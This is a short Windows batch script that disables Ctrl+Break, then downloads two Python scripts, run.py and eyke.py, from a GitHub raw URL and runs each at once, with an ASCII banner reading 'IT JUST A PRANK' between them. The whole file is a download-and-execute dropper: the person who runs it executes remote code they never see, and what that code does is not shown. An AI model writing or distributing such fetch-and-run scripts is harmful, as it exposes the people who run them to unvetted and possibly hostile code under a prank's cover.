@echo off
title Please wait - Script Running
setlocal ENABLEEXTENSIONS
break off

echo Downloading script from GitHub...

REM Download run.py
curl -o run.py https://raw.githubusercontent.com/RaAlpha168/Python/main/run.py

echo Running the Python script...
python run.py

REM Remove delay – this was waiting 10 seconds before continuing
REM timeout /t 10 /nobreak >nul

REM Just echo your message instantly
echo "   /|\       /|     /|  /|\   /|    /|   /|/|   /|\         /|\                /|\   /|\   /| |\   /|\   /|\   /|\   /|\  "
echo "    |       / |    / |   |   / |    |   |     / | |         |                  /   \ /   \  | | |  |     |     |     |    "
echo "    |      /__|   /__|   |  /__|    |   |\|  /__| |         |                  \    |\    \ | | |  |     |     |     |    "
echo "    |     /   |  /   |   | /   |    |   |    /   | |        |                   \   | \   | | | |  |     |     |     |    "
echo "   /|\   /    | /    |  /|/    |   /|\  |   /    | |       /|\                   \_/   \_/  |_|_|   \_/  \_/   \_/   \_/  "
echo "    |  " 
echo "                                           IT JUST A PRANK                  " 

REM Download eyke.py
curl -o eyke.py https://raw.githubusercontent.com/RaAlpha168/Python/main/eyke.py

echo Running eyke.py...
python eyke.py

echo Script execution completed.

REM Remove pause
REM pause >nul

goto :eof
